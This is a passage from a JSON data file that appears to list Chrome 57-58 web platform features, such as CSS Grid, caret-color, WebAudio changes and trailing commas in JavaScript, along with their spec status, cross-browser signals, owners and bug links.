    },
    "summary": "RFC 2818 describes two methods to match a domain name against a certificate - using the available names within the subjectAlternativeName extension, or, in the absence of a SAN extension, falling back to the commonName.\r\n\r\nThe fallback to the commonName was deprecated in RFC 2818 (published in 2000), but support still remains in a number of TLS clients, often incorrectly.",
    "id": 4981025180483584,
    "resources": {
      "docs": [
        "https://tools.ietf.org/html/rfc2818",
        "https://cabforum.org/baseline-requirements-documents/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:48.297140",
      "by": "ericbidelman@google.com"
    },
    "name": "Trailing comma in JavaScript function parameter lists",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tc39.github.io/ecma262/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5051",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A small modification to JavaScript syntax allows trailing comma in formal parameter lists and in argument lists. For example, all the following become valid:\r\n\r\nfunction f(a, b,) { return a + b }\r\nlet g = (a, b,) => a + b\r\nf(1, 2,) + g(3, 4,)\r\n\r\nThis is expected to be available by default in Chrome 58.\r\n",
    "id": 5656834660630528,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-28 06:53:17.173140",
      "by": "kojii@chromium.org"
    },
    "name": "Unprefix CSS 'line-break' property",
    "comments": "This property has shipped in M58 without the launch process due to an error. Please see the following discussion for more details.\r\nhttps://groups.google.com/a/chromium.org/d/msg/style-dev/uzUmvT7vIO8/dIXuip4OAgAJ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-text-3/#line-break-property",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1011369",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "kojii@chromium.org",
          "qyearsley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Layout"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/735539",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/ja-jp/library/ms530782.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=168213",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The CSS 'line-break' property specifies the strictness of line-breaking rules. The exact definition of the strictness depends on languages.\r\n\r\nOur implementation relies on ICU (see doc link) which supports East Asian writing systems and Finnish.",
    "id": 5137645088800768,
    "resources": {
      "docs": [
        "http://cldr.unicode.org/development/development-process/design-proposals/specifying-text-break-variants-in-locale-ids"
      ],
      "samples": [
        "https://ja.stackoverflow.com/questions/33378/chrome%E3%81%A7%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%81%AE%E7%A6%81%E5%89%87%E5%87%A6%E7%90%86%E3%81%8C%E5%8A%B9%E3%81%8B%E3%81%AA%E3%81%84"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:38.998960",
      "by": "ericbidelman@google.com"
    },
    "name": "VTTRegion-related bits of TextTrack",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/webvtt",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=690014",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The interface elements regions, addRegion() and removeRegion() have been removed from the WebVTT spec and will be removed from Chrome. The VTTCue.region property was added and the VTTRegion interface was updated to match a late version of the specification.",
    "id": 5308626495340544,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-08-15 20:18:05.933640",
      "by": "rtoy@chromium.org"
    },
    "name": "WebAudio: Add buffering/latency hint via latencyHint",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "ios": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/564276",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Currently, WebAudio will use the lowest latency possible for the audio device for the best interactive behavior.  However, for some use-cases such as media playback, this causes unnecessary power and/or CPU utilization.\r\n\r\nThe latencyHint is a hint from the developer that such a latency is not required. The latencyHint is either an AudioContextLatencyCategory value or a double specifying the desired numeric latency.  This is a hint to Chrome.",
    "id": 5678699475107840,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#BaseAudioContext",
        "https://webaudio.github.io/web-audio-api/#idl-def-AudioContextOptions"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:01.611660",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: AudioBuffer constructor only takes one argument",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/678273",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently the AudioBuffer constructor takes two arguments: the context, and the AudioBufferOptions.  The context argument is removed so that only AudioBufferOptions is required.  In addition the sampleRate member of AudioBufferOptions is now required.",
    "id": 5740353252491264,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#AudioBuffer",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioBuffer/AudioBuffer"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:03.485160",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Remove AudioSourceNode interface",
    "comments": "Firefox and Edge do not have this interface.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/663818",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the AudioSourceNode interface.  This interface is not part of the WebAudio specification, is not constructible, and has no attributes so it basically has no user-accessible functionality.",
    "id": 5753709124386816,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:12.206990",
      "by": "ericbidelman@google.com"
    },
    "name": "XSS Auditor violation report MIME type.",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "mkwst@chromium.org",
          "tsepez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=691726",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The XSS Auditor's violation reports are now sent with a MIME type of `application/xss-auditor-report` (as opposed to `application/json`).",
    "id": 6227193935953920,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:24:54.908760",
      "by": "Patket@microsoft.com"
    },
    "name": "color-gamut media query",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/mediaqueries-4/#color-gamut",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "hubbe@chromium.org",
          "johnpallett@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/685456",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Expose the approximate range of colors supported by the user agent and the output device in a CSS Media Query.",
    "id": 5354410980933632,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@media",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/@media/color-gamut"
      ],
      "samples": [
        "https://beaufortfrancois.github.io/sandbox/media-capabilities/color-gamut-media-query.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:30:29.006350",
      "by": "Patket@microsoft.com"
    },
    "name": "display: flow-root",
    "tags": [
      "display",
      "flow",
      "clearfix",
      "flow-root"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-display-3/#valdef-display-flow-root",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=1322191",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "robhogan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "ios": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/672508",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/10152756/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=165603",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "display: flow-root generates a block container box, and lays out its contents using flow layout. It always establishes a new block formatting context for its contents.",
    "id": 5769454877147136,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/display"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:58.371780",
      "by": "ericbidelman@google.com"
    },
    "name": "webkitdropzone global attribute",
    "tags": [
      "dropzone drag drop"
    ],
    "comments": "This is a prefixed attribute that will never be standardized. The standardized version of the attribute is failing to gain traction from other browser implementers. Therefore, we would like to remove the attribute before Web content starts depending on it.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#the-dropzone-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=723008#c1",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "pwnall@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>DataTransfer"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/688943",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=723008#c0",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The dropzone global attribute was introduced by the HTML5 drag and drop specification as a declarative method for specifying an HTML element's willingness to be the target of a drag-and-drop operation, the content types that can be dropped onto the element, and the drag-and-drop operation (copy/move/link).\r\n\r\nNo browser has implemented the unprefixed version. Blink and WebKit implement a prefixed form of the attribute, webkitdropzone. We would like to remove the prefixed attribute.",
    "id": 5718005866561536,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/dropzone"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:53.439730",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Add sequence<DOMString> constructor to PresentationRequest and PresentationConnection.url",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/presentation-api/#interface-presentationrequest",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.w3.org/2016/05/25-webscreens-minutes.html#item03",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "mfoltz@chromium.org",
          "zhaobin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/627655",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://www.w3.org/2016/05/25-webscreens-minutes.html#item03",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This change adds a new constructor to PresentationRequest taking taking multiple URLs (sequence<DOMString>), in addition to the existing constructor that takes a single URL.  It also adds the url attribute to PresentationConnection to tell the site what URL was presented.\r\n",
    "id": 5687338902487040,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:45.937750",
      "by": "ericbidelman@google.com"
    },
    "name": "Add |timecode| to MediaRecorder's BlobEvent",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/mediacapture-record/MediaRecorder.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/mediacapture-record/pull/95#pullrequestreview-13888091",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "mcasas@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>MediaStream>Recording"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/676211",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "MediaRecorder produces BlobEvents that have no timing information. [1] requested adding a DOMHighResTimestamp to said BlobEvent [2].  The Pull Request was reviewed and approved by the only two implementors of the said API, Gecko and Chrome.\r\n\r\n\r\n[1] https://github.com/w3c/mediacapture-record/issues/73\r\n[2] https://github.com/w3c/mediacapture-record/pull/95",
    "id": 5643877683822592,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/BlobEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/BlobEvent/timecode",
        "https://developer.mozilla.org/en-US/docs/Web/API/BlobEvent/BlobEvent"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:30:51.755260",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS ::placeholder pseudo element",
    "tags": [
      "CSS",
      "placeholder"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-pseudo-4/#placeholder-pseudo",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/623345",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Unprefixed version of ::-webkit-input-placeholder.\r\n",
    "id": 6715780926275584,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-17 19:29:04.360380",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS Grid Layout",
    "tags": [
      "css-grid",
      "grid",
      "grid layout"
    ],
    "comments": "Impl status as of Jul 2016: https://people.igalia.com/mrego/talks/blinkon6-css-grid-layout/",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-grid/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=616605",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "svillar@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/79180",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/gridupdate/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=60731",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A two-dimensional grid-based layout system, optimized for user interface design.",
    "id": 4589636412243968,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Grids",
        "https://css-tricks.com/snippets/css/complete-guide-grid/"
      ],
      "samples": [
        "http://gridbyexample.com/",
        "http://labs.jensimmons.com/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:31:20.008520",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS UI: caret-color property",
    "tags": [
      "css-ui",
      "caret-color"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-ui/#propdef-caret-color",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1063162",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rego@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=665422",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/17595823-implement-caret-color-support",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=166572",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This property allows coloring the insertion caret.",
    "id": 5720917787279360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/caret-color"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-06 16:17:06.019898",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS logical height and width",
    "tags": [
      "css-contain"
    ],
    "comments": "https://www.smashingmagazine.com/2018/03/understanding-logical-properties-values/",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-logical-1/#dimension-properties",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/41",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "xing.xu@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 57,
        "flag": false,
        "bug": "https://crbug.com/538475",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/7438435-css-logical-properties",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=185977",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement {inline-,block-}size and {min-,max-}{inline-,block-}size, which are introduced by CSS Logical Properties.\r\nThe related properties are:  inline-size, block-size , min-inline-size,min-block-size, max-inline-size, max-block-size   \r\nProvide the author with the ability to control layout through logical, rather than physical, direction and dimension mappings.",
    "id": 6325742262550528,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/docs/Web/CSS/CSS_Logical_Properties",
        "https://drafts.csswg.org/css-writing-modes/#logical-to-physical"
      ],
      "samples": [
        "https://jsfiddle.net/xuxing/fL8rpcko/",
        "https://jsfiddle.net/xuxing/433e3fdw/",
        "https://jsfiddle.net/xuxing/25xh1mpn/",
        "https://jsfiddle.net/xuxing/ug00c0vj/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-20 18:25:43.948400",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS3 Text Decorations",
    "tags": [
      "text-decoration",
      "decoration",
      "text",
      "underline",
      "overline",
      "line-through",
      "decoration",
      "color",
      "style",
      "dashed",
      "dotted",
      "wavy"
    ],
    "comments": "Safari ships a prefixed version.\r\n\r\nFor Edge, requested on Uservoice.\r\n\r\nThis status entry applies to the line decorations subsection of the specification. \r\n\r\nText-underline-position left, right and multiple value support is currently work in progress.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-text-decor-3/#line-decoration",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=59109",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/665898",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/6514536-text-decoration-styling",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=58491",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
